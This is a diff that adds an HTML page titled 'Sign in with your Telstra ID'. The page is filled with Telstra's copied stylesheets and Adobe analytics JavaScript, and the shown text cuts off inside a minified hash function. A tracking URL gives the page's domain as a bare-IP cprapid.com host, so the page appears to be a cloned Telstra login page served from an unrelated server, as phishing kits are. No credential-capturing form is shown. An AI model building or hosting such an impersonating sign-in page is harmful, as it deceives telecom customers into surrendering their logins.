@@ -1,0 +1,1929 @@
+<html lang="en" dir="ltr"><head>
+    <!-- meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <!-- favicon -->
+    <link rel="icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-favicon.png">
+    <link rel="apple-touch-icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-apple-touch.png">
+    <!-- base -->
+
+    <!-- title -->
+    <title>Sign in with your Telstra ID</title>
+    <!-- includes -->
+    <style>
+        @import url('https://myid.telstra.com/identity/assets/fonts/telstra-fonts.css');
+        @import url('https://myid.telstra.com/identity/assets/css/min/telstra-able.min.css');
+        @import url('https://myid.telstra.com/identity/assets/css/min/cnsb-custom.min.css');
+    </style>
+    <script src="https://connect.facebook.net/signals/config/452897358227251?v=2.9.205&amp;r=stable&amp;domain=104-168-56-26.cprapid.com&amp;hme=91e1bfdb39aff53ea3a4a1f39ed64da8fd6f63253e5c24269dbb2994c8fed743&amp;ex_m=74%2C128%2C113%2C117%2C65%2C6%2C106%2C73%2C19%2C101%2C93%2C55%2C58%2C11%2C184%2C205%2C212%2C208%2C209%2C211%2C32%2C107%2C57%2C81%2C210%2C179%2C182%2C51%2C50%2C206%2C207%2C192%2C140%2C45%2C197%2C194%2C195%2C37%2C152%2C18%2C54%2C201%2C200%2C142%2C21%2C44%2C2%2C47%2C69%2C70%2C71%2C75%2C97%2C20%2C17%2C100%2C96%2C95%2C114%2C56%2C116%2C42%2C115%2C33%2C98%2C43%2C90%2C29%2C180%2C183%2C149%2C14%2C15%2C16%2C8%2C9%2C28%2C25%2C26%2C61%2C66%2C68%2C79%2C105%2C108%2C30%2C80%2C12%2C10%2C84%2C52%2C24%2C110%2C109%2C111%2C102%2C13%2C23%2C4%2C41%2C78%2C22%2C162%2C136%2C77%2C1%2C99%2C60%2C88%2C36%2C31%2C86%2C87%2C92%2C40%2C7%2C94%2C85%2C48%2C35%2C38%2C0%2C72%2C118%2C91%2C5%2C89%2C249%2C177%2C126%2C165%2C158%2C3%2C39%2C67%2C46%2C112%2C49%2C83%2C64%2C63%2C34%2C103%2C62%2C59%2C53%2C82%2C76%2C27%2C104%2C119" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script src="https://myid.telstra.com/identity/assets/js/common.min.js"></script>
+    <script src="https://assets.adobedtm.com/launch-EN150fea03ccaa40d3b4a005dbafdb143c.min.js"></script><script src="https://assets.adobedtm.com/extensions/EPbf7b42aa08bc4f10879b1484195e80d1/AppMeasurement.min.js" async=""></script><script src="https://cdn.branch.io/branch-latest.min.js" async=""></script><script>_satellite["_runScript1"](function(event, target, Promise) {
+/*
+ *Name: Adobe Target CS Integration
+ *Version: 1.0
+ */
+function isEmpty(val) {
+  try {
+    return val === undefined || val == null || val.length <= 0 ? true : false;
+  } catch (e) {
+    const payload = {
+        error: e,
+        ruleName: event.$rule.name,
+        functionName: 'isEmpty'
+    }
+    _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+    return true;
+  }
+}
+
+function key(obj) {
+  try {
+    return Object.keys(obj)
+        .map(function (k) {
+            return k + "" + obj[k];
+        })
+        .join("");
+  } catch (e) {
+    const payload = {
+        error: e,
+        ruleName: event.$rule.name,
+        functionName: 'isEmpty'
+    }
+    _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+    return '';
+  }
+}
+
+function distinct(arr) {
+  try {
+    var result = arr.reduce(function (acc, e) {
+        acc[key(e)] = e;
+        return acc;
+    }, {});
+    return Object.keys(result).map(function (k) {
+        return result[k];
+    });
+  } catch (e) {
+    const payload = {
+        error: e,
+        ruleName: event.$rule.name,
+        functionName: 'distinct'
+    }
+    _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+    return [];
+  }
+}
+
+document.addEventListener(adobe.target.event.REQUEST_SUCCEEDED, function (e) {
+  try {
+    window.ttMETA = typeof window.ttMETA != "undefined" ? window.ttMETA : [];
+    var tokens = e.detail.responseTokens;
+    if (isEmpty(tokens)) {
+        return;
+    }
+    var uniqueTokens = distinct(tokens);
+    uniqueTokens.forEach(function (token) {
+        window.ttMETA.push({
+            CampaignName: token["activity.name"],
+            CampaignId: token["activity.id"],
+            RecipeName: token["experience.name"],
+            RecipeId: token["experience.id"],
+            OfferId: token["option.id"],
+            OfferName: token["option.name"],
+        });
+    });
+  } catch (error) {
+    const payload = {
+        error: error,
+        ruleName: event.$rule.name,
+        functionName: 'adobe.target.event.REQUEST_SUCCEEDED'
+    }
+    _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' });
+  }
+});
+//Adobe Target CS Integration End
+});</script><script>_satellite["_runScript2"](function(event, target, Promise) {
+window.scriptLoad = window.scriptLoad ? window.scriptLoad : {};
+window.scriptLoad["target"] = "loaded";
+});</script><script>_satellite["_runScript3"](function(event, target, Promise) {
+
+/* This code is pasted at "Target-Mbox (local Mboxes) - PT:53" in Adobe Launch rules
+* This code is version controlled in optimisation-AT/optimisation.js in Bitbucket
+*/
+/* DYNAMITE - Dynamic insertion of TnT code
+* Drops Omniture TnT mBox code dynamically onto the page.
+* writeMBox takes a collection of key/name pairs in the following format:
+* CampaignIdentifier {
+*		arrLocations	: [] An array of urls written as regular expressions where this mbox should display. [REGEXP, NOT STRING]
+*		js				: Load a specific mbox javascript file. Defaults to mbox.js
+*		mboxName		: Value that should go inside the mboxCreate() function.
+*		campaign		: Comma seperated list of the names using this mbox as set in TnT admin and paste here. For governance purposes.
+*		className		: class to use on the mbox wrapper div (Optional).
+*		mboxType		: To late load, or use s{} object variables such as pageName, props or eVars use "mboxDefine". This will switch to a mboxDefine/Update mode.
+* }
+*/
+var tmBox = {
+	HomeTileLeft : {
+		arrLocations	: [ { hostname:/^www.telstra.com.au$/i, pathname:/^\/personal$/i} ],
+		mboxName		: "homepage-tile-left-AT",
+	},
+	HomeTileMiddle : {
+		arrLocations	: [ { hostname:/^www.telstra.com.au$/i, pathname:/^\/personal$/i} ],
+		mboxName		: "homepage-tile-center-AT",
+	},
+	HomeTileRight : {
+		arrLocations	: [ { hostname:/^www.telstra.com.au$/i, pathname:/^\/personal$/i} ],
+		mboxName		: "homepage-tile-right-AT",
+	},
+	OrderStart : {
+		arrLocations	: [ { hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/mobileshop\/orderflow|\/mobile-phones\/plans\/buy\//i},
+							{ hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/bundles\/(orderflow|checkout)/i},
+							{ hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/(moving-home\/$|bundles\/moving-home-authenticated)/i},
+							{ hostname:/^www.telstra.com.au$/i, pathname:/\/mobile-broadband-plan-product.cfm/i},
+							{ hostname:/^www.telstra.com.au$/i, pathname:/\/online-shop\/order.cfm/i},
+							{ hostname:/^www.telstra.com.au$/i, pathname:/\/online-shop\/business\/order.cfm/i},
+							{ hostname:/^www.telstra.com.au$/i, pathname:/\/online-shop\/homephone-plan-product.cfm/i},
+							{ hostname:/^www.telstra.com.au$/i, pathname:/\/online-shop\/business\/business-phone-product.cfm/i},
+							{ hostname:/^store.telstra.com.au$/i, fnCheck: function() {try { return document.getElementById("omniturePageType").value === "Checkout";} catch(e) {return false;}} }
+						],
+		mboxName		: "OrderStart-AT",
+	},
+
+	OrderStartSinglePage : {
+		arrLocations	: [ {hostname:/^((|uat-)checkout.((np|preprod).in.)?telstra.com.au)$/i, pathname: /^\/(postpaid|consumer|jbhifi)\/(mobile|wireline|mbb|tablet)/i}],
+		mboxName		: "OrderStart-AT",
+	},
+	OrderComplete : {
+		arrLocations	: [ { hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/bundles\/orderflow\/summary/i},
+							{ hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/mobileshop\/orderconfirmation/i},
+							{ hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/(moving-home\/summary|bundles\/moving-home\/submit-request)/i},
+							{ hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/checkout\/ordersuccess/i},
+							{ hostname:/^www.telstra.com.au$/i, pathname:/\/online-shop\/order-complete.cfm/i},
+							{ hostname:/^store.telstra.com.au$/i, fnCheck: function() {try { return document.getElementById("omniturePageType").value === "Confirmation";} catch(e) {return false;}} }
+						],
+		mboxName		: "OrderComplete-AT",
+	},
+
+	OrderCompleteSinglePage : {
+		arrLocations	:[{hostname:/^checkout.((np|preprod).in.)?telstra.com.au$/i, pathname: /^\/(postpaid|consumer|jbhifi)\/(mobile|wireline|mbb|tablet)/i}],
+		mboxName		: "OrderComplete-AT",
+		mboxCommandExtra: mboxOnSinglePageAppl
+	},
+
+	OrderCompleteCrossSell : {
+		arrLocations	: [{ hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/mobileshop\/orderconfirmation/i}],
+		mboxName		: "OrderCompleteCrossSell",
+		mboxCommandExtra: standardShopCommands
+	},
+
+	OrderCompleteCrossSellPCF : {
+		arrLocations	: [{hostname:/^(|uat-)checkout.((np|preprod).in.)?telstra.com.au$/i, pathname: /^\/(postpaid|consumer|jbhifi|gaming)\/(mobile|wireline|mbb|tablet|xbox)/i},
+			{hostname:/^telstra.com.au$/i, pathname:/^\/checkout/i},
+			{hostname:/^publish.uat.tcom.corp.telstra.com$/i, pathname:/^\/testing\/apps\/ecomm\/ecomm-base-page/i}],
+		mboxName		: "OrderCompleteCrossSell",
+		mboxCommandExtra: mboxOnSinglePageAppl
+	},
+	OrderCompleteCrossSellMPM : {
+		arrLocations	: [{hostname:/^m.bigpond.com$/i, pathname:/^\/mpm\/picmroOrderSent/i},
+							{hostname:/^mobile-model.bigpond.com$/i, pathname:/^\/mpm\/picmroOrderSent/i},
+							{hostname:/^m.bigpond.com$/i, pathname:/^\/mpm\/picbyoOrderSent/i},
+							{hostname:/^mobile-model.bigpond.com$/i, pathname:/^\/mpm\/picbyoOrderSent/i}],
+		mboxName		: "OrderCompleteCrossSell",
+		mboxCommandExtra: digitalDataShopCommand
+	},
+	// PrepaidOrderStart : {
+	// 	arrLocations	: [ {hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/prepaid-mobile\/checkout\/buy/i} ],
+	// 	mboxName		: "PrepaidOrderStart",
+	// 	mboxType		: "mboxCreate"
+	// },
+	// PrepaidOrderComplete : {
+	// 	arrLocations	: [ {hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/prepaid-mobile\/checkout\/ordersuccess/i} ],
+	// 	mboxName		: "PrepaidOrderComplete",
+	// 	mboxType		: "mboxCreate"
+	// },
+	// PrepaidActivation :	{
+	// 	arrLocations	:[ {hostname:/www.my.telstra.com/i, pathname:/^\/activate/i},
+	// 					   {hostname:/www.my.telstra.com/i, pathname:/^\/web\/myaccount\/activate/i},
+	// 					   {hostname:/www.my.telstra.com/i, pathname:/^\/myaccount\/auth_activate/i},
+	// 					   {hostname:/www.my.telstra.com/i, pathname:/^\/auth_activate/i},
+	// 					   {hostname:/www.my.telstra.com/i, pathname:/^\/group\/myaccount\/auth_activate/i} ],
+	// 	mboxName		: "PrepaidActivation",
+	// 	mboxType		: "mboxCreate"
+	// },
+	// PrepaidRecharge :	{
+	// 	arrLocations	:[{pathname:/^\/my-account\/prepaid-recharge$/i},
+	// 					  {pathname:/^\/prepaidrecharge\/spring\/main/i},
+	// 					  {pathname:/^\/prepaidrecharge\/spring\/mobile/i}],
+	// 	mboxName		: "PrepaidRecharge",
+	// 	mboxType		: "mboxCreate"
+	// },
+	// PrepaidRechargeComplete :	{
+	// 	arrLocations	:[{pathname:/^\/prepaidrecharge\/spring\/main/i,search:/eventId=submit/i},
+	// 					  {pathname:/^\/prepaidrecharge\/spring\/mobile/i,search:/eventId=submit/i}],
+	// 	mboxName		: "PrepaidRechargeComplete",
+	// 	mboxType		: "mboxCreate"
+	// },
+	// PVCS :	{
+	// 	arrLocations	:[{hostname:/say.telstra.com.au/i},
+	// 					  {hostname:/service.telstra.com.au/i}],
+	// 	mboxName		: "PVCS",
+	// 	mboxType		: "mboxCreate"
+	// },
+	// OnlineShop : {
+	// 	arrLocations	: [ { hostname:/www.telstra.com.au/i, pathname:/^\/online-shop\/$/i} ],
+	// 	mboxName		: "OnlineShop",
+	// 	mboxType		: "mboxCreate"
+	// },
+	MyAccount :	{
+		arrLocations	:[{hostname:/www.my.telstra.com.au/i, pathname:/\/myaccount\//i}],
+		mboxName		: "MyAccount-AT",
+	},
+	// Feedback :	{
+	// 	arrLocations	:[{hostname:/www.telstra.com.au/i, pathname:/\/my-account\/survey$/i}],
+	// 	mboxName		: "FeedbackSurvey",
+	// 	mboxType		: "mboxDefine"
+	// },
+	// Signon :	{
+	// 	arrLocations	:[{hostname:/signon.telstra.com/i, pathname:/\/login/i}],
+	// 	mboxName		: "Signon-AT",
+	// },
+	// ETC :	{
+	// 	arrLocations	:[{hostname:/www.my.telstra.com.au/i, pathname:/\/myaccount\/contract-details/i}],
+	// 	mboxName		: "ETC",
+	// 	mboxType		: "mboxDefine"
+	// },
+	// YTT  :{
+	// 	arrLocations	:[{hostname:/yourtelstratools.telstra.com/i, pathname:/^\/group/i}],
+	// 	mboxName		: "YTTDashboard",
+	// 	mboxType		: "mboxCreate"
+	// },
+	// TAnalyst  :{
+	// 	arrLocations	:[{hostname:/billing.telstra.com/i, pathname:/^\/cv\/scripts/i}],
+	// 	mboxName		: "TAnalyst",
+	// 	mboxType		: "mboxDefine"
+	// },
+	// LatestOffers  :{
+	// 	arrLocations	:[{hostname:/^www.telstra.com.au$/i, pathname:/^\/latest-offers/i}],
+	// 	mboxName		: "LatestOffers",
+	// 	mboxType		: "mboxCreate"
+	// },
+	TComExplore   :{
+		arrLocations	:[{protocol:/https/i, hostname:/^www.telstra.com.au$/i, pathname:/^\//i}],
+		mboxName		: "TComExplore-AT",
+	},
+	// Helix   :{
+	// 	arrLocations	:[{protocol:/https/i, hostname:/^www.telstra.com.au$/i, pathname:/^\/checkout$/i}],
+	// 	mboxName		: "Helix",
+	// 	mboxType		: "mboxCreate"
+	// 	//mboxCommandExtra: standardShopCommands
+	// },
+	SMB   :{
+		arrLocations	:[{hostname:/^www.telstra.com.au$/i, pathname:/^\/small-business/i},
+						{hostname:/^smallbusiness.telstra.com.au$/i, pathname: /^\//i},
+						{hostname:/^telstra-small-b-1.neto.com.au$/i, pathname: /^\//i}],
+		mboxName		: "SMB-AT",
+		//mboxCommandExtra: standardShopCommands
+	},
+	TBE   :{
+		arrLocations	:[{hostname:/^www.telstra.com.au$/i, pathname:/^\/business-enterprise/i}],
+		mboxName		: 'TBE-AT',
+		boundary		: boundaryFactory
+	},
+	NBNSpeedBoost   :{
+		arrLocations	:[	{hostname:/^www.telstra.com.au$/i, pathname:/^\/broadband\/nbn\/nbn-bundles$/i},
+							{hostname:/^www.telstra.com.au$/i, pathname:/^\/broadband\/nbn\/nbn-plans$/i},
+							{hostname:/^onlineshop.telstra.com.au$/i, pathname:/^\/bundles\/checkout$/i}],
+		mboxName		: "NBNSpeedBoost-AT",
+	},
+
+	// GlobalMPM   :{
+	// 	arrLocations	:[	{hostname:/^mobile-model2.bigpond.com$/i, pathname:/./i},
+	// 						{hostname:/^mobile-model3.bigpond.com$/i, pathname:/./i},
+	// 						{hostname:/^mobile-model.bigpond.com$/i, pathname:/\/mpm/i},
+	// 						{hostname:/^m.bigpond.com$/i, pathname:/\/mpm/i},
+	// 						{hostname:/^127.0.0.1$/i, port:/^8181$/, pathname:/\/mpm/i}],
+	// 	mboxName		: "GlobalMPM",
+	// 	mboxType		: "mboxDefine",
+	// 	mboxCommandExtra: function() {
+	// 		if (window.omnitureData && omnitureData.dl && omnitureData.dl.mpmInfo && omnitureData.dl.mpmInfo.MSISDN) {
+	// 			return ["profile.MSISDN=" + omnitureData.dl.mpmInfo.MSISDN];
+	// 		}
+	// 	},
+	// },
+	// FOSS	:{
+	// 	arrLocations	:[	{hostname:/^foxtel.telstra.com.au$/i, pathname:/./i},
+	// 						{hostname:/^uat1.foxtel.telstra.com.au$/i, pathname:/./i}],
+	// 	mboxName		: "FOSS",
+	// 	mboxType		: "mboxCreate"
+	// 	//mboxCommandExtra: fossShopCommands
+	// },
+	"dynamite": function () {
+		for (var key in tmBox) {
+			if (typeof tmBox[key] === "object") {
+				try {
+					tmBox.writeMBox(tmBox[key]);
+				} catch (e) { console.error(e); }
+			}
+		}
+	},
+	"writeMBox": function (oMBoxArgs) {
+		/* Assertions */
+		if (!(oMBoxArgs.arrLocations instanceof Array)) { return false; }
+		if (!oMBoxArgs.mboxName) { return false; }
+
+		/* Default values */
+		oMBoxArgs.blacklist = window.omnitureData && omnitureData.blacklist ? omnitureData.blacklist : {};
+		oMBoxArgs.className = oMBoxArgs.mboxName || "mboxDefault";
+		oMBoxArgs.AAMsegments = (_satellite.cookie.get("aam_dest_sc") || "").replace(/aam|=/ig, "");
+		oMBoxArgs.CPT = _satellite.cookie.get("URD-" + _satellite.cookie.get("GUID_S"));
+		//oMBoxArgs.dynamicProfiles = oMBoxArgs.mboxCommandExtra && oMBoxArgs.mboxCommandExtra();
+		oMBoxArgs.dynamicProfiles = oMBoxArgs.mboxCommandExtra;
+		oMBoxArgs.mboxArguments = {
+			//oMBoxArgs.mboxName, // Must be the first argument
+			"path":  location.pathname,
+			"AAMsegments" : oMBoxArgs.AAMsegments,
+			"profile.CPT" : oMBoxArgs.CPT
+		};
+
+		if(oMBoxArgs.boundary != undefined && oMBoxArgs.boundary !=""){
+			oMBoxArgs.boundary(oMBoxArgs);
+		}
+		//if (oMBoxArgs.dynamicProfiles) oMBoxArgs.mboxArguments = oMBoxArgs.mboxArguments.concat(oMBoxArgs.dynamicProfiles);
+		tmBox.mboxAsync(oMBoxArgs);
+	},
+	"isMatchedAnyLocation": function (oMBoxArgs) {
+		/* Find the first location match and return true */
+		for (var i = 0; i < oMBoxArgs.arrLocations.length; i++) {
+			var matched = false;
+			conditionTest: for (var key in oMBoxArgs.arrLocations[i]) {
+				if (oMBoxArgs.arrLocations[i].hasOwnProperty(key)) {
+					var regex = oMBoxArgs.arrLocations[i][key];
+					if (/host|hostname|href|pathname|port|protocol|search|hash|referrer|fnCheck/i.test(key)) {
+						switch (key) {
+							case "referrer": matched = regex.test(document[key]); break;
+							case "fnCheck": matched = typeof regex === "function" ? regex() : false; break;
+							default: matched = regex.test(window.location[key]); break;
+						}
+					}
+					if (!matched) { break conditionTest; } // all regex conditions must match true
+				}
+			}
+			if (matched) { return true; }
+		}
+		return false;
+	},
+	"mboxAsync": function (oMBoxArgs) {
+		if (tmBox.isMatchedAnyLocation(oMBoxArgs)) {
+
+			if (oMBoxArgs.dynamicProfiles){
+				oMBoxArgs.mboxCommandExtra(oMBoxArgs,oMBoxArgs.mboxArguments, createAsyncMbox);
+			} else{
+				createAsyncMbox(oMBoxArgs);
+			}
+		}
+	},
+	"mboxConsoleDebug": function (oMBoxArgs) {
+		if (window.debug) {
+			console.group(oMBoxArgs.mboxName);
+			console.log("datalayer readystate:", omnitureData.dl.trackingInfo.ready.siteCode);
+			console.dir({ oMBoxArgs: oMBoxArgs });
+			console.groupEnd();
+		}
+	}
+};
+
+function boundaryFactory(oMBoxArgs){
+	switch (oMBoxArgs.mboxName){
+		case "TBE-AT":
+			oMBoxArgs.mboxArguments.at_property = "79764387-cd6b-5a5f-2776-f06fd4afa23c";
+		break;
+	}
+}
+
+function createAsyncMbox (oMBoxArgs){
+	var documentInterval = window.setInterval(function(){
+			if(document && document.body){
+				clearInterval(documentInterval);
+				var mboxDiv = document.createElement('div');
+				mboxDiv.setAttribute('id', oMBoxArgs.className);
+				mboxDiv.createComment = oMBoxArgs.mboxName;
+				document.body.appendChild(mboxDiv);
+				/* Execute the mboxDefine() function call */
+				if (mboxDefine && mboxUpdate) {
+					adobe.target.getOffer({
+						"mbox": oMBoxArgs.mboxName,
+						"params": oMBoxArgs.mboxArguments,
+						"success": function(offers) {
+							adobe.target.applyOffer( {
+								"mbox": oMBoxArgs.mboxName,
+								"offer": offers
+							} );
+						},
+						"error": function(status, error) {
+							if (console && console.log) {
+								console.log(status);
+								console.log(error);
+							}
+						},
+						"timeout": 5000
+					});
+					tmBox.mboxConsoleDebug(oMBoxArgs);
+				} else {
+					if (window.debug) console.write("mboxDefine does not exist");
+				}
+		}
+	},200);
+}
+
+function fossShopCommands() {
+	var commandExtra = [];
+	if (analyticsToolkit.checkDependency("omnitureData.dl.unicaInfo.data.recommendedOfferLists")) {
+		var offerList = omnitureData.dl.unicaInfo.data.recommendedOfferLists;
+		if (offerList.length) {
+			var offer = offerList[0];
+			if (offer.length && offer[0].offerCode) { commandExtra.push("profile.unicaOfferCode=" + offer[0].offerCode); }
+			if (offer.length && offer[0].offerName) { commandExtra.push("profile.unicaOfferName=" + offer[0].offerName); }
+		}
+	}
+
+	if (commandExtra.length) { return commandExtra; }
+}
+
+
+function getListOfProducts(itemType,name){
+	var _items = "";
+	if(window.digitalData.transaction.item.length > 0){
+		for(var i = 0; i < window.digitalData.transaction.item.length; i++){
+			_items += _items == "" ? window.digitalData.transaction.item[i][itemType][name]: "|"+ window.digitalData.transaction.item[i][itemType][name];
+		}
+	}
+
+	return _items;
+}
+
+
+function digitalDataShopCommand(oMBoxArgs,mboxArguments, callback){
+	var newInterval = window.setInterval(function(){
+	if(window.digitalData && window.digitalData.transaction && window.digitalData.transaction.item[0]){
+		clearInterval(newInterval);
+		var _productNames = getListOfProducts("productInfo", "productName"),
+			_manufacturer = getListOfProducts("productInfo","manufacturer"),
+			_deviceSku = getListOfProducts("productInfo","sku"),
+			_tertiaryCategory = getListOfProducts("category","tertiaryCategory"),
+			_secondaryCategory = getListOfProducts("category","secondaryCategory"),
+			_orderType = getListOfProducts("productInfo","orderType");
+
+			mboxArguments["manufacturer"] = _manufacturer;
+			mboxArguments["productName"] = _productNames;
+			mboxArguments["deviceSku"] = _deviceSku;
+			mboxArguments["tertiaryCategory"] = _tertiaryCategory;
+			mboxArguments["secondaryCategory"] = _secondaryCategory;
+			mboxArguments["orderType"] = _orderType;
+			oMBoxArgs.mboxArguments = mboxArguments;
+			callback(oMBoxArgs);
+		}
+	},200);
+
+}
+
+function extendHistoryApi(oMBoxArgs,mboxArguments, callback, type) {
+	var fnOrig = history[type];
+	return function() {
+		var results = fnOrig.apply(history, arguments);
+		// Extension start
+		var info = { // pass this additional data to the event.
+			newState: arguments[0],
+			newStateTitle: arguments[1],
+			newStateUrl: arguments[2]
+		};
+
+		if(info.newStateUrl.indexOf("/confirmation") > -1 && (oMBoxArgs.mboxName.indexOf("OrderComplete-AT") > -1 || oMBoxArgs.mboxName.indexOf("OrderCompleteCrossSell") > -1) ){
+			digitalDataShopCommand(oMBoxArgs,mboxArguments, callback);
+		} else if (/\/consumer\/wireline\/(guest|auth)\/(new|upgrade)/i.test(info.newStateUrl) && oMBoxArgs.mboxName.indexOf("OrderStart") > -1){
+			callback(oMBoxArgs);
+		}
+	};
+}
+
+function mboxOnSinglePageAppl (oMBoxArgs,mboxArguments, callback){
+			/** Extends the history.pushState function to create a pushstate event */
+			history.pushState = extendHistoryApi(oMBoxArgs,mboxArguments, callback,"pushState");
+
+			/** Extends the history.replaceState function to create a replacestate event */
+			history.replaceState = extendHistoryApi(oMBoxArgs,mboxArguments, callback,"replaceState");
+}
+
+function standardShopCommands(oMBoxArgs,mboxArguments, callback) {
+	var newInterval = window.setInterval(function(){
+		if(window.omnitureData && window.omnitureData.dl && window.omnitureData.dl.orderInfo && window.omnitureData.dl.orderInfo.cart[0]){
+				var commandExtra = [];
+				if (window.omnitureData.dl.orderInfo.cart[0] && window.omnitureData.dl.orderInfo.cart[0].info) {
+					mboxArguments["manufacturer"] = window.omnitureData.dl.orderInfo.cart[0].info.manufacturer || "";
+					mboxArguments["productName"] = window.omnitureData.dl.orderInfo.cart[0].info.name || "";
+					mboxArguments["customerType"] = window.omnitureData.dl.userInfo.customerType || "";
+					mboxArguments["isExistingCustomer"] = window.omnitureData.dl.userInfo.isExistingCustomer || "false";
+					mboxArguments["deviceSku"] = window.omnitureData.dl.orderInfo.cart[0].info.sku || "";
+					mboxArguments["tertiaryCategory"] = window.omnitureData.dl.orderInfo.cart[0].info.subCategory || "";
+					mboxArguments["secondaryCategory"] = window.omnitureData.dl.orderInfo.cart[0].info.category || "";
+				}
+				if (omnitureData.dl.productInfo.group && omnitureData.dl.productInfo.category && omnitureData.dl.productInfo.subCategory) {
+					mboxArguments["profile.group"] = omnitureData.dl.productInfo.group || "";
+					mboxArguments["profile.category"] = omnitureData.dl.productInfo.category || "";
+					mboxArguments["profile.subCategory"] = omnitureData.dl.productInfo.subCategory|| "";
+				}
+				if (omnitureData.dl.productInfo.planSize) {
+					mboxArguments["profile.planSize"] = omnitureData.dl.productInfo.planSize || "";
+				}
+				clearInterval(newInterval);
+				if (commandExtra.length) { oMBoxArgs.mboxArguments = mboxArguments.concat(commandExtra); }
+				callback(oMBoxArgs);
+			}
+	},200);
+}
+(function analyticsTNT() {
+	if (/^\/thanks/i.test(window.location.pathname)) { return; } // disable mbox for Telstra Thanks
+
+	if (!/BACTest|Keynote|KTXN|Uptrends/i.test(navigator.userAgent) && !/BACTest/i.test(document.cookie)) {
+		tmBox.dynamite();
+	}
+})();
+
+});</script><script>
+/***
+The code in this section should NOT be modified by anyone other than a Telstra Digital Adobe Launch architect.
+
+This file contains various functions required to support the Adobe Launch architecture
+***/
+
+try {
+  if (_satellite.environment.stage == "development") _satellite.setDebug(true);
+}
+catch(err) {
+  //
+}
+// Temporary settings for testing
+//_satellite.logger.info('EU cookie set to true');
+//_satellite.cookie.set('sat_track', "true", {expires: 30});
+
+// Setup base tdTags object
+window._tdTags = {};
+
+// Transformation Phase is false by default
+_tdTags.transformationPhase = false;
+
+// Setup a site settings data object
+_tdTags.siteSettings = {};
+
+// Setup a processing log array
+_tdTags.processingLog = {};
+_tdTags.processingLog.dataElements = [];
+_tdTags.processingLog.history = [];
+
+// Setup a processed data object
+_tdTags.data = {};
+_tdTags.data.pageInfo = {};
+_tdTags.data.eventInfo = {};
+_tdTags.data.tmp = {};
+
+// Set up common utils object - CR 2 April 20
+_tdTags.utils = {};
+
+// Set up "publicly-accessible" area that external applications (non-Adobe Launch) can access to - CR 2 Sep 21
+_tdTags.public = {};
+
+///////////////////////////////////////////////
+// Define functions used throughout the TD Tags framework
+_tdTags.overrideDigitalData = function(structure, val) {
+	try {
+		var lastItem = structure.slice(-1)[0];
+		if (typeof lastItem == "string" && lastItem != "") {
+			structure.reduce(function(obj, key) {
+				return (obj) ? 
+				(
+					(key == lastItem) ?
+						(
+							(obj[key] !== undefined) ?
+							((obj[key] == val) ? (obj[key]=val) : (obj[key+"_orig"]=obj[key],obj[key]=val)) :
+							(obj[key]=val,obj[key+"_orig"]="manually added")
+						) :
+						(
+							(obj[key] !== undefined) ?
+							obj[key] :
+							(obj[key]={},obj[key])
+						)
+				) :
+				(
+					obj[key]
+				)
+			}, digitalData);
+		}
+		else {
+			_satellite.logger.error('_tdTags.overrideDigitalData error - last item must be a string attribute');
+		}
+	}
+	catch(err) {
+		_satellite.logger.error(err);
+	}
+}
+
+_tdTags.addProcessingLog = function(processingPhase, message, dataElement) {
+	try {
+		var addEntry = true;
+		var timeStamp = new Date().toLocaleString();
+		var processingLogEntry = {
+			"processingPhase" : processingPhase,
+			"message" : message,
+			"timestamp" : timeStamp
+		}
+		if (typeof dataElement == "string" && dataElement != "" && _tdTags.processingLog.dataElements.indexOf(dataElement) >= 0) addEntry = false;
+		if (addEntry === true) {
+			if (typeof dataElement != "undefined") _tdTags.processingLog.dataElements.push(dataElement);
+			_tdTags.processingLog.history.push(processingLogEntry);
+		}
+	}
+	catch(err) {
+		_satellite.logger.error(err);
+	}
+}
+
+///////////////////////////////////////////////
+// Define some commonly used functions
+_tdTags.gqp = function(name,url){url=url||window.location.href;name=name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");var regexS="[\\?&]"+name+"=([^&#]*)";var regex=new RegExp(regexS);var results=regex.exec(url);if(results===null){return"";}else{return results[1];}}
+
+if (typeof _tdTags != "undefined" && typeof _tdTags.addProcessingLog == "function") _tdTags.addProcessingLog('Framework', 'setup tdTags object | Finished setting up _tdTags object in rule: Framework | Page Top | 001 | setup tdTags object');
+</script><script>
+_tdTags.hash = {
+    sha1: function sha1 (r) {
+        function o(r, o) { return r << o | r >>> 32 - o } function e(r) { var o, e = ""; for (o = 7; o >= 0; o--)e += (r >>> 4 * o & 15).toString(16); return e } var t, a, h, n, C, c, f, d, A, u = new Array(80), g = 1732584193, i = 4023233417, s = 2562383102, S = 271733878, m = 3285377520, p = (r = function (r) { r = r.replace(/\r\n/g, "\n"); for (var o = "", e = 0; e < r.length; e++) { var t = r.charCodeAt(e); t < 128 ? o += String.fromCharCode(t) : t > 127 && t < 2048 ? (o += String.fromCharCode(t >> 6 | 192), o += String.fromCharCode(63 & t | 128)) : (o += String.fromCharCode(t >> 12 | 224), o += String.fromCharCode(t >> 6 & 63 | 128), o += String.fromCharCode(63 & t | 128)) } return o }(r)).length, l = new Array; for (a = 0; a < p - 3; a += 4)h = r.charCodeAt(a) << 24 | r.charCodeAt(a + 1) << 16 | r.charCodeAt(a + 2) << 8 | r.charCodeAt(a + 3), l.push(h); switch (p % 4) { case 0: a = 2147483648; break; case 1: a = r.charCodeAt(p - 1) << 24 | 8388608; break; case 2: a = r.charCodeAt(p - 2) << 24 | r.charCodeAt(p - 1) << 16 | 32768; break; case 3: a = r.charCodeAt(p - 3) << 24 | r.charCodeAt(p - 2) << 16 | r.charCodeAt(p - 1) << 8 | 